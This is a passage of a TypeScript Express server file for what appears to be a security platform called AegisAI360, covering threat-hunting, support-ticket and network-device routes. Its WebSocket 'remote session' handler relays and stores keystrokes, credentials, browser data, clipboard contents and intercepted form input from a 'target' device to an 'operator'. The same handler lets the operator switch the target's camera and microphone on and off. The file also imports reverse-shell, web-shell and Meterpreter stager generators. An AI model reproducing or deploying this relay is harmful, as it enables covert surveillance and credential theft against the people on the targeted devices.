import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { WebSocket, WebSocketServer } from "ws";
import { storage } from "./storage";
import OpenAI from "openai";
import { aiCacheKey, getCached, setCache, compressChatHistory } from "./aiCache";
import { chatStorage } from "./replit_integrations/chat/storage";
import { z } from "zod";
import { createHash, randomBytes } from "crypto";
import {
  insertSecurityEventSchema,
  insertIncidentSchema,
  insertThreatIntelSchema,
  insertSecurityPolicySchema,
  insertAssetSchema,
  insertQuarantineItemSchema,
  insertResponsePlaybookSchema,
  type User,
} from "@shared/schema";
import { requireAuth, requireRole, requirePlanFeature, sessionMiddleware } from "./auth";
import passport from "passport";
import type { IncomingMessage } from "http";
import { runNetworkVulnerabilityScan, scanInfrastructureAsset, resolveHostToIp, parseRogueScanToDevices, type RogueScanResult } from "./networkMonitor";
import { getUncachableStripeClient, getStripePublishableKey, isStripeLiveMode } from "./stripeClient";
import { createIngestionRouter } from "./ingestion";
import { createSuperAdminRouter } from "./superAdmin";
import { createThreatFeedsRouter } from "./threatFeeds";
import { createAgentRouter } from "./agentApi";
import ddosRouter from "./ddosRoutes";
import offensiveRouter from "./offensiveRoutes";
import stressTargetRouter from "./stressTargetEndpoint";
import { abuseIpdbLookup, otxLookup, urlscanLookup, safeBrowsingLookup, malwareBazaarLookup } from "./services/threatIntel";
import { ResponseEngine } from "./responseEngine";
import { AlertEngine } from "./alertEngine";
import { testChannel } from "./notificationService";
import { scanPorts, lookupDNS, checkSSL, scanHeaders, scanVulnerabilities, isPrivateTarget } from "./scanEngine";
import { enumerateSubdomains, bruteforceDirectories, fingerprintTechnology, detectWAF, whoisLookup, testSQLInjection, testXSS, identifyHash, crackHash, analyzePassword, fetchDiscoveredPaths, testBypassTechniques } from "./pentestEngine";
import { lookupHash, classifyBehavior, generateYARARule, generateSigmaRule, extractIOCs, listFamilies, extractIOCsFromText, getThreatActor, getKillChain, getMitreHeatmap } from "./trojanAnalyzer";
import { analyzePermissions, testMobileEndpoint, checkOWASPMobile, lookupDeviceVulnerabilities } from "./mobilePentestEngine";
import { generateReverseShell, generateBindShell, generateWebShell, generateMeterpreterStager, encodePayload, getSupportedLanguages } from "./payloadGenerator";
import { SCENARIOS } from "./threatSimulator";
import { getFrameworks, assessFramework, getOverallScore } from "./complianceEngine";
import { analyzePassword as auditAnalyzePassword, checkBreachStatus, auditPolicy, generatePassword } from "./passwordAuditor";
import { analyzeEmail } from "./emailAnalyzer";
import { searchCves, getCveDetail, getRecentCves } from "./cveDatabase";
import { inspectSSL } from "./sslInspector";
import { scanLink } from "./services/linkScanner";
import { startRecoveryOperation, getOperation, getAllOperations } from "./services/websiteRecovery";
import { registerAegisAgentRoutes } from "./aegisAgentRoutes";
import { db } from "./db";
import * as schema from "@shared/schema";
import { and, eq, desc, sql, gte, inArray } from "drizzle-orm";

const openai = new OpenAI({
  apiKey: process.env.AI_INTEGRATIONS_OPENAI_API_KEY,
  baseURL: process.env.AI_INTEGRATIONS_OPENAI_BASE_URL,
});

const SECURITY_SYSTEM_PROMPT = `You are AegisAI360, a SOC cybersecurity analyst assistant. Analyze security events, identify IOCs, map MITRE ATT&CK techniques, recommend defensive actions, assess threat severity, and explain attack patterns. Be clear, professional, and actionable. Reference ATT&CK techniques when applicable.`;

function getOrgId(req: Request): number {
  const user = req.user as User;
  return user.organizationId!;
}

function getUserId(req: Request): string {
  return (req.user as User).id;
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  const wss = new WebSocketServer({ server: httpServer, path: "/ws" });

  const rcClients = new Map<string, { operator?: WebSocket; target?: WebSocket }>();
  const clientOrgMap = new WeakMap<WebSocket, number>();

  function broadcast(data: unknown) {
    const payload = data as any;
    const targetOrgId = payload?.orgId;
    const message = JSON.stringify(data);
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        if (targetOrgId != null) {
          const clientOrg = clientOrgMap.get(client);
          if (clientOrg !== targetOrgId) return;
        }
        client.send(message);
      }
    });
  }

  wss.on("connection", (ws, req: IncomingMessage) => {
    let rcToken: string | null = null;
    let rcRole: string | null = null;

    const fakeRes = { setHeader: () => {}, end: () => {}, getHeader: () => undefined } as any;
    sessionMiddleware(req as any, fakeRes, () => {
      passport.initialize()(req as any, fakeRes, () => {
        passport.session()(req as any, fakeRes, () => {
          const user = (req as any).user as User | undefined;
          if (user?.organizationId) {
            clientOrgMap.set(ws, user.organizationId);
          }
        });
      });
    });

    ws.on("message", async (raw) => {
      try {
        const msg = JSON.parse(raw.toString());

        if (msg.type === "rc_operator" && msg.token) {
          const session = await storage.getRemoteSessionByToken(msg.token);
          if (!session || session.status === "closed" || session.status === "expired" || new Date() > new Date(session.expiresAt)) {
            ws.send(JSON.stringify({ type: "rc_error", error: "Session invalid or expired" }));
            return;
          }
          rcToken = msg.token;
          rcRole = "operator";
          if (!rcClients.has(msg.token)) rcClients.set(msg.token, {});
          rcClients.get(msg.token)!.operator = ws;
          const target = rcClients.get(msg.token)?.target;
          if (target && target.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: "rc_target_connected" }));
          }
          return;
        }

        if (msg.type === "rc_join" && msg.token) {
          const session = await storage.getRemoteSessionByToken(msg.token);
          if (!session || session.status === "closed" || session.status === "expired" || new Date() > new Date(session.expiresAt)) {
            ws.send(JSON.stringify({ type: "rc_error", error: "Session invalid or expired" }));
            return;
          }
          await storage.updateRemoteSession(session.id, session.organizationId, { status: "active", lastActivity: new Date() });
          rcToken = msg.token;
          rcRole = "target";
          if (!rcClients.has(msg.token)) rcClients.set(msg.token, {});
          rcClients.get(msg.token)!.target = ws;
          const operator = rcClients.get(msg.token)?.operator;
          if (operator && operator.readyState === WebSocket.OPEN) {
            operator.send(JSON.stringify({ type: "rc_target_connected" }));
          }
          return;
        }

        if (rcToken && rcClients.has(rcToken)) {
          const pair = rcClients.get(rcToken)!;
          const targetToOperatorTypes = ["rc_data", "rc_device_info", "rc_location", "rc_file", "rc_permission_granted", "rc_permission_denied", "rc_track_toggled", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_auto_harvest", "rc_keylog", "rc_form_intercept", "rc_activity", "rc_heartbeat", "rc_device_status"];
          if (targetToOperatorTypes.includes(msg.type)) {
            if (rcRole !== "target") return;
            if (pair.operator && pair.operator.readyState === WebSocket.OPEN) {
              pair.operator.send(JSON.stringify(msg));
            }
            const recordableTypes = ["rc_auto_harvest", "rc_credentials", "rc_clipboard", "rc_browser_data", "rc_device_info", "rc_location", "rc_permission_granted", "rc_permission_denied", "rc_activity", "rc_keylog", "rc_form_intercept", "rc_file", "rc_device_status"];
            if (recordableTypes.includes(msg.type)) {
              (async () => {
                const session = await storage.getRemoteSessionByToken(rcToken);
                if (session) {
                  await storage.createRemoteSessionEvent({
                    sessionId: session.id,
                    eventType: msg.type,
                    eventData: msg.data || msg,
                  });
                }
              })().catch((err) => console.error("Failed to record remote session event:", err));
            }
            return;
          }
          const operatorToTargetTypes = ["rc_request_permission", "rc_toggle_camera", "rc_toggle_mic"];
          if (operatorToTargetTypes.includes(msg.type)) {
            if (rcRole !== "operator") return;
            if (pair.target && pair.target.readyState === WebSocket.OPEN) {
              pair.target.send(JSON.stringify(msg));
            }
            return;
          }
          if (msg.type === "rc_offer" || msg.type === "rc_ice_candidate") {
            const dest = rcRole === "target" ? pair.operator : pair.target;
            if (dest && dest.readyState === WebSocket.OPEN) {
              dest.send(JSON.stringify(msg));
            }
            return;
          }
          if (msg.type === "rc_answer") {
            const dest = rcRole === "operator" ? pair.target : pair.operator;
            if (dest && dest.readyState === WebSocket.OPEN) {
              dest.send(JSON.stringify(msg));
            }
            return;
          }
        }
      } catch (err) { console.error("WebSocket message handling error:", err); }
    });

    ws.on("close", () => {
      if (rcToken && rcClients.has(rcToken)) {
        const pair = rcClients.get(rcToken)!;
        if (rcRole === "target") {
          pair.target = undefined;
          if (pair.operator && pair.operator.readyState === WebSocket.OPEN) {
            pair.operator.send(JSON.stringify({ type: "rc_target_disconnected" }));
          }
        } else if (rcRole === "operator") {
          pair.operator = undefined;
        }
        if (!pair.operator && !pair.target) {
          rcClients.delete(rcToken);
        }
      }
    });
  });

  const responseEngine = new ResponseEngine(broadcast);
  const alertEngine = new AlertEngine(broadcast);

  app.use("/api/ingest", createIngestionRouter(broadcast, (event) => alertEngine.evaluateEvent(event)));
  app.use("/api/admin", createSuperAdminRouter());
  app.use("/api/threat-feeds", createThreatFeedsRouter());
  app.use("/api/agent", createAgentRouter());
  app.use("/api/ddos", requireAuth, requirePlanFeature("allowThreatIntel"), ddosRouter);
  app.use("/api/offensive", requireAuth, requirePlanFeature("allowThreatIntel"), offensiveRouter);
  app.use("/api/stress-target", requireAuth, stressTargetRouter);

  registerAegisAgentRoutes(app);

  app.use("/api/dashboard", requireAuth);
  app.use("/api/security-events", requireAuth);
  app.use("/api/incidents", requireAuth);
  app.use("/api/threat-intel", requireAuth);
  app.use("/api/security-policies", requireAuth);
  app.use("/api/ai-conversations", requireAuth);
  app.use("/api/assets", requireAuth);
  app.use("/api/audit-logs", requireAuth);
  app.use("/api/honeypot", requireAuth);
  app.use("/api/quarantine", requireAuth);
  app.use("/api/playbooks", requireAuth);
  app.use("/api/organization", requireAuth);
  app.use("/api/invites", requireAuth);
  app.use("/api/attack-map", requireAuth);
  app.use("/api/firewall", requireAuth);
  app.use("/api/alert-rules", requireAuth);
  app.use("/api/notifications", requireAuth);
  app.use("/api/api-keys", requireAuth);
  app.use("/api/response", requireAuth);
  app.use("/api/scan", requireAuth);
  app.use("/api/settings", requireAuth);
  app.use("/api/simulate", requireAuth);
  app.use("/api/support", requireAuth);
  app.use("/api/network", requireAuth);
  app.use("/api/protection", requireAuth);
  app.use("/api/password", requireAuth);
  app.use("/api/threat-hunting", requireAuth);

  app.get("/api/threat-hunting/queries", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const queries = await storage.getThreatHuntingQueries(orgId);
      res.json(queries);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch threat hunting queries" });
    }
  });

  app.post("/api/threat-hunting/queries", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { name, description, query } = z.object({
        name: z.string().min(1),
        description: z.string().optional(),
        query: z.object({
          timeRange: z.string().optional(),
          eventTypes: z.array(z.string()).optional(),
          severities: z.array(z.string()).optional(),
          sourceIps: z.array(z.string()).optional(),
          destIps: z.array(z.string()).optional(),
          keywords: z.string().optional(),
          tactics: z.array(z.string()).optional(),
          techniques: z.array(z.string()).optional(),
        }),
      }).parse(req.body);
      const created = await storage.createThreatHuntingQuery({
        organizationId: orgId,
        name,
        description: description || null,
        query,
        createdBy: userId,
      });
      res.status(201).json(created);
    } catch (error) {
      res.status(500).json({ error: "Failed to create threat hunting query" });
    }
  });

  app.delete("/api/threat-hunting/queries/:id", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const deleted = await storage.deleteThreatHuntingQuery(parseInt(req.params.id), orgId);
      if (!deleted) return res.status(404).json({ error: "Query not found" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete threat hunting query" });
    }
  });

  app.post("/api/threat-hunting/search", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const filters = z.object({
        timeRange: z.string().optional(),
        eventTypes: z.array(z.string()).optional(),
        severities: z.array(z.string()).optional(),
        sourceIps: z.array(z.string()).optional(),
        destIps: z.array(z.string()).optional(),
        keywords: z.string().optional(),
        tactics: z.array(z.string()).optional(),
        techniques: z.array(z.string()).optional(),
      }).parse(req.body);

      let conditions: any[] = [eq(schema.securityEvents.organizationId, orgId)];

      if (filters.timeRange) {
        const now = new Date();
        let startDate: Date;
        switch (filters.timeRange) {
          case "1h": startDate = new Date(now.getTime() - 60 * 60 * 1000); break;
          case "6h": startDate = new Date(now.getTime() - 6 * 60 * 60 * 1000); break;
          case "24h": startDate = new Date(now.getTime() - 24 * 60 * 60 * 1000); break;
          case "7d": startDate = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000); break;
          case "30d": startDate = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000); break;
          default: startDate = new Date(now.getTime() - 24 * 60 * 60 * 1000);
        }
        conditions.push(gte(schema.securityEvents.createdAt, startDate));
      }

      if (filters.eventTypes && filters.eventTypes.length > 0) {
        conditions.push(inArray(schema.securityEvents.eventType, filters.eventTypes));
      }
      if (filters.severities && filters.severities.length > 0) {
        conditions.push(inArray(schema.securityEvents.severity, filters.severities));
      }
      if (filters.sourceIps && filters.sourceIps.length > 0) {
        conditions.push(inArray(schema.securityEvents.sourceIp, filters.sourceIps));
      }
      if (filters.destIps && filters.destIps.length > 0) {
        conditions.push(inArray(schema.securityEvents.destinationIp, filters.destIps));
      }
      if (filters.tactics && filters.tactics.length > 0) {
        conditions.push(inArray(schema.securityEvents.tactic, filters.tactics));
      }
      if (filters.techniques && filters.techniques.length > 0) {
        conditions.push(inArray(schema.securityEvents.techniqueId, filters.techniques));
      }

      let query = db.select().from(schema.securityEvents)
        .where(and(...conditions))
        .orderBy(desc(schema.securityEvents.createdAt))
        .limit(500);

      let events = await query;

      if (filters.keywords && filters.keywords.trim()) {
        const kw = filters.keywords.toLowerCase();
        events = events.filter(e =>
          e.description?.toLowerCase().includes(kw) ||
          e.source?.toLowerCase().includes(kw) ||
          e.rawData?.toLowerCase().includes(kw) ||
          e.eventType?.toLowerCase().includes(kw)
        );
      }

      const timelineBuckets: Record<string, number> = {};
      events.forEach(e => {
        const hour = new Date(e.createdAt).toISOString().slice(0, 13) + ":00";
        timelineBuckets[hour] = (timelineBuckets[hour] || 0) + 1;
      });
      const timeline = Object.entries(timelineBuckets)
        .sort(([a], [b]) => a.localeCompare(b))
        .map(([time, count]) => ({ time, count }));

      res.json({ events, timeline, total: events.length });
    } catch (error) {
      console.error("Threat hunting search error:", error);
      res.status(500).json({ error: "Failed to execute threat hunting search" });
    }
  });

  app.post("/api/threat-hunting/nl-search", async (req, res) => {
    try {
      const { query: nlQuery } = z.object({ query: z.string().min(1) }).parse(req.body);

      try {
        const nlCacheKey = aiCacheKey("nl-search", nlQuery);
        const nlCached = getCached(nlCacheKey);
        let content: string;
        if (nlCached) {
          content = nlCached;
        } else {
          const completion = await openai.chat.completions.create({
            model: "gpt-4o-mini",
            messages: [
              {
                role: "system",
                content: `Convert natural language to JSON filter for security events. Fields: timeRange("1h"|"6h"|"24h"|"7d"|"30d"), eventTypes[], severities[], sourceIps[], destIps[], keywords, tactics[], techniques[]. JSON only.`
              },
              { role: "user", content: nlQuery }
            ],
            max_tokens: 200,
            temperature: 0.1,
          });
          content = completion.choices[0]?.message?.content?.trim() || "{}";
          setCache(nlCacheKey, content);
        }
        const jsonMatch = content.match(/\{[\s\S]*\}/);
        const filters = jsonMatch ? JSON.parse(jsonMatch[0]) : {};
        res.json({ filters });
      } catch {
        res.json({ filters: { keywords: nlQuery } });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to parse natural language query" });
    }
  });

  app.post("/api/support/tickets", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      if (!orgId) return res.status(400).json({ error: "Organization required" });
      const userId = getUserId(req);
      const { subject, description, priority, category } = z.object({
        subject: z.string().min(1),
        description: z.string().min(1),
        priority: z.enum(["low", "medium", "high", "critical"]).optional().default("medium"),
        category: z.enum(["technical", "billing", "account", "security"]).optional().default("technical"),
      }).parse(req.body);
      const ticket = await storage.createSupportTicket({
        organizationId: orgId,
        userId,
        subject,
        description,
        priority,
        category,
        messages: [{ role: "user", userId, content: description, timestamp: new Date().toISOString() }],
      });
      res.status(201).json(ticket);
    } catch (error) {
      res.status(500).json({ error: "Failed to create ticket" });
    }
  });

  app.get("/api/support/tickets", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const tickets = await storage.getSupportTickets(orgId);
      res.json(tickets);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch tickets" });
    }
  });

  app.get("/api/support/tickets/:id", async (req, res) => {
    try {
      const ticket = await storage.getSupportTicket(parseInt(req.params.id));
      if (!ticket) return res.status(404).json({ error: "Ticket not found" });
      const orgId = getOrgId(req);
      const user = req.user as any;
      if (ticket.organizationId !== orgId && !user?.isSuperAdmin) {
        return res.status(403).json({ error: "Access denied" });
      }
      res.json(ticket);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ticket" });
    }
  });

  app.post("/api/support/tickets/:id/messages", async (req, res) => {
    try {
      const ticket = await storage.getSupportTicket(parseInt(req.params.id));
      if (!ticket) return res.status(404).json({ error: "Ticket not found" });
      const orgId = getOrgId(req);
      const user = req.user as any;
      if (ticket.organizationId !== orgId && !user?.isSuperAdmin) {
        return res.status(403).json({ error: "Access denied" });
      }
      const { content } = z.object({ content: z.string().min(1) }).parse(req.body);
      const messages = Array.isArray(ticket.messages) ? [...(ticket.messages as any[])] : [];
      messages.push({ role: user?.isSuperAdmin ? "admin" : "user", userId: getUserId(req), content, timestamp: new Date().toISOString() });
      const updated = await storage.updateSupportTicket(ticket.id, { messages });
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to add message" });
    }
  });

  app.post("/api/support/tickets/:id/request-remote", async (req, res) => {
    try {
      const ticket = await storage.getSupportTicket(parseInt(req.params.id));
      if (!ticket) return res.status(404).json({ error: "Ticket not found" });
      const orgId = getOrgId(req);
      if (ticket.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });
      const updated = await storage.updateSupportTicket(ticket.id, { remoteSessionRequested: true });
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to request remote session" });
    }
  });

  app.get("/api/network/devices", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const devices = await storage.getNetworkDevices(orgId);
      res.json(devices);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch network devices" });
    }
  });

  app.get("/api/network/devices/:id", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Device not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });
      res.json(device);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch device" });
    }
  });

  app.post("/api/network/scan", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { scanType } = z.object({
        scanType: z.enum(["quick", "full"]).optional().default("quick"),
      }).parse(req.body || {});

      const scan = await storage.createNetworkScan({
        organizationId: orgId,
        networkName: "Network Scan",
        scanType,
        status: "running",
        devicesFound: 0,
        unauthorizedCount: 0,
      });

      const agents = await storage.getAgentsByOrg(orgId);
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
      const onlineAgent = agents.find(a => a.status === "online" && a.lastSeen && new Date(a.lastSeen) > fiveMinutesAgo);

      if (onlineAgent) {
        await storage.createCommand({
          agentId: onlineAgent.id,
          command: "rogue_scan",
          params: JSON.stringify({ scanId: scan.id }),
          status: "pending",
        });

        res.json({ scanId: scan.id, status: "running", source: "agent", agentId: onlineAgent.id });
      } else {
        await storage.updateNetworkScan(scan.id, {
          status: "failed",
          completedAt: new Date(),
          results: { error: "No online agents available" },
        });

        res.json({
          scanId: scan.id,
          status: "no_agents",
          source: "none",
          message: "No online agents available. Deploy an endpoint agent to perform real network scans.",
        });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to start network scan" });
    }
  });

  app.post("/api/network/scan/vulnerability", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const devices = await storage.getNetworkDevices(orgId);

      const scan = await storage.createNetworkScan({
        organizationId: orgId,
        networkName: "Vulnerability Scan",
        scanType: "vulnerability",
        status: "running",
        devicesFound: devices.length,
        unauthorizedCount: devices.filter(d => d.authorization === "unauthorized").length,
      });

      res.json({ scanId: scan.id, status: "running" });

      try {
        const { vulnerabilities, riskScore } = runNetworkVulnerabilityScan(devices);

        await storage.updateNetworkScan(scan.id, {
          status: "completed",
          vulnerabilities,
          completedAt: new Date(),
          results: { riskScore, totalVulnerabilities: vulnerabilities.length },
        });

        const criticalVulns = vulnerabilities.filter((v: any) => v.severity === "critical" || v.severity === "high");
        if (criticalVulns.length > 0) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "network_vulnerability",
            severity: "critical",
            source: "network-monitor",
            description: `Network vulnerability scan found ${criticalVulns.length} critical/high severity issue(s)`,
            sourceIp: "vuln-scanner",
            status: "new",
          });
        }

      } catch (err) {
        console.error("Vulnerability scan error:", err);
        await storage.updateNetworkScan(scan.id, { status: "failed" });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to start vulnerability scan" });
    }
  });

  app.get("/api/network/scans", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const scans = await storage.getNetworkScans(orgId);
      res.json(scans);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch scan history" });
    }
  });

  app.patch("/api/network/devices/:id", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Device not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });

      const data = z.object({
        authorization: z.enum(["authorized", "unauthorized", "unknown"]).optional(),
        notes: z.string().nullable().optional(),
        isCompanyDevice: z.boolean().optional(),
        assignedUser: z.string().nullable().optional(),
        hostname: z.string().optional(),
      }).parse(req.body);

      const updated = await storage.updateNetworkDevice(device.id, data);
      res.json(updated);
    } catch (error) {
      res.status(500).json({ error: "Failed to update device" });
    }
  });

  app.post("/api/network/devices/:id/block", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Device not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });

      await storage.updateNetworkDevice(device.id, { status: "blocked", authorization: "unauthorized" });

      await storage.createFirewallRule({
        organizationId: orgId,
        ruleType: "ip_block",
        value: device.ipAddress,
        action: "block",
        reason: `Blocked network device: ${device.hostname || device.macAddress}`,
        status: "active",
      });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "block_network_device",
        targetType: "network_device",
        targetId: String(device.id),
        details: `Blocked device ${device.hostname || device.macAddress} (${device.ipAddress})`,
      });

      res.json({ success: true, message: "Device blocked" });
    } catch (error) {
      res.status(500).json({ error: "Failed to block device" });
    }
  });

  app.post("/api/network/devices/:id/kick", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Device not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });

      await storage.updateNetworkDevice(device.id, { status: "offline" });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "kick_network_device",
        targetType: "network_device",
        targetId: String(device.id),
        details: `Kicked device ${device.hostname || device.macAddress} (${device.ipAddress}) from network`,
      });

      res.json({ success: true, message: "Device kicked from network" });
    } catch (error) {
      res.status(500).json({ error: "Failed to kick device" });
    }
  });

  app.post("/api/network/devices/:id/authorize", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Device not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });

      await storage.updateNetworkDevice(device.id, { authorization: "authorized", status: "online" });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "authorize_network_device",
        targetType: "network_device",
        targetId: String(device.id),
        details: `Authorized device ${device.hostname || device.macAddress} (${device.ipAddress})`,
      });

      res.json({ success: true, message: "Device authorized" });
    } catch (error) {
      res.status(500).json({ error: "Failed to authorize device" });
    }
  });

  app.delete("/api/network/devices/:id", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Device not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });

      await storage.deleteNetworkDevice(device.id);
      res.json({ success: true, message: "Device removed" });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete device" });
    }
  });

  app.get("/api/network/traffic", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const devices = await storage.getNetworkDevices(orgId);
      const totalIn = devices.reduce((sum, d) => sum + (Number(d.dataIn) || 0), 0);
      const totalOut = devices.reduce((sum, d) => sum + (Number(d.dataOut) || 0), 0);
      const topDevices = devices
        .sort((a, b) => (Number(b.dataIn) + Number(b.dataOut)) - (Number(a.dataIn) + Number(a.dataOut)))
        .slice(0, 10)
        .map(d => ({
          id: d.id,
          hostname: d.hostname,
          ipAddress: d.ipAddress,
          dataIn: Number(d.dataIn),
          dataOut: Number(d.dataOut),
          total: Number(d.dataIn) + Number(d.dataOut),
        }));
      res.json({ totalIn, totalOut, totalDevices: devices.length, topDevices });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch traffic data" });
    }
  });

  app.get("/api/packet-captures", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const captures = await storage.getPacketCaptures(orgId);
      res.json(captures);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch packet captures" });
    }
  });

  app.get("/api/packet-captures/:agentId", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const agentId = parseInt(req.params.agentId);
      const agent = await storage.getAgentById(agentId);
      if (!agent || agent.organizationId !== orgId) return res.status(404).json({ error: "Agent not found" });
      const captures = await storage.getPacketCapturesByAgent(agentId, orgId);
      res.json(captures);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch packet captures" });
    }
  });

  app.get("/api/arp-alerts", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const alerts = await storage.getArpAlerts(orgId);
      res.json(alerts);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ARP alerts" });
    }
  });

  app.get("/api/arp-alerts/:agentId", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const agentId = parseInt(req.params.agentId);
      const agent = await storage.getAgentById(agentId);
      if (!agent || agent.organizationId !== orgId) return res.status(404).json({ error: "Agent not found" });
      const alerts = await storage.getArpAlertsByAgent(agentId, orgId);
      res.json(alerts);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch ARP alerts" });
    }
  });

  app.get("/api/bandwidth/:agentId", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const agentId = parseInt(req.params.agentId);
      const agent = await storage.getAgentById(agentId);
      if (!agent || agent.organizationId !== orgId) return res.status(404).json({ error: "Agent not found" });
      const logs = await storage.getBandwidthLogs(agentId, orgId);
      res.json(logs);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch bandwidth logs" });
    }
  });

  app.post("/api/network/assets", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({
        target: z.string().min(1).max(253),
      }).parse(req.body);

      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];

      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Private/internal targets cannot be scanned from the cloud" });
      }

      const resolvedIp = await resolveHostToIp(cleanTarget);
      const macPlaceholder = `00:00:00:${Math.floor(Math.random() * 256).toString(16).padStart(2, "0").toUpperCase()}:${Math.floor(Math.random() * 256).toString(16).padStart(2, "0").toUpperCase()}:${Math.floor(Math.random() * 256).toString(16).padStart(2, "0").toUpperCase()}`;

      const device = await storage.createNetworkDevice({
        organizationId: orgId,
        macAddress: macPlaceholder,
        ipAddress: resolvedIp,
        hostname: cleanTarget,
        manufacturer: null,
        deviceType: "server",
        os: null,
        status: "online",
        authorization: "authorized",
        dataIn: 0,
        dataOut: 0,
        networkName: null,
        signalStrength: null,
        location: null,
        isCompanyDevice: true,
        lastSeen: new Date(),
        firstSeen: new Date(),
        notes: null,
      });

      res.json({ device, status: "scanning" });

      try {
        const scanResult = await scanInfrastructureAsset(cleanTarget);

        await storage.updateNetworkDevice(device.id, {
          notes: JSON.stringify(scanResult),
          lastSeen: new Date(),
          os: scanResult.headers?.serverInfo || null,
        });

        const scan = await storage.createNetworkScan({
          organizationId: orgId,
          networkName: cleanTarget,
          scanType: "infrastructure",
          status: "completed",
          devicesFound: 1,
          unauthorizedCount: 0,
          results: scanResult as any,
          completedAt: new Date(),
        });

        if (scanResult.summary.criticalIssues > 0 || scanResult.summary.highIssues > 0) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "infrastructure_scan",
            severity: scanResult.summary.criticalIssues > 0 ? "critical" : "high",
            source: "infrastructure-monitor",
            description: `Infrastructure scan of ${cleanTarget} found ${scanResult.summary.totalIssues} issue(s): ${scanResult.summary.plainLanguage.slice(0, 3).join("; ")}`,
            sourceIp: resolvedIp,
            status: "new",
          });
        }
      } catch (err) {
        console.error("Infrastructure scan error:", err);
        await storage.updateNetworkDevice(device.id, {
          notes: JSON.stringify({ error: "Scan failed", scannedAt: new Date().toISOString(), target: cleanTarget }),
        });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to add asset" });
    }
  });

  app.post("/api/network/scan-asset/:id", async (req, res) => {
    try {
      const device = await storage.getNetworkDevice(parseInt(req.params.id));
      if (!device) return res.status(404).json({ error: "Asset not found" });
      const orgId = getOrgId(req);
      if (device.organizationId !== orgId) return res.status(403).json({ error: "Access denied" });

      const target = device.hostname || device.ipAddress;
      if (isPrivateTarget(target)) {
        return res.status(400).json({ error: "Private/internal targets cannot be scanned" });
      }

      res.json({ status: "scanning", deviceId: device.id });

      try {
        const scanResult = await scanInfrastructureAsset(target);
        await storage.updateNetworkDevice(device.id, {
          notes: JSON.stringify(scanResult),
          lastSeen: new Date(),
          os: scanResult.headers?.serverInfo || device.os,
        });

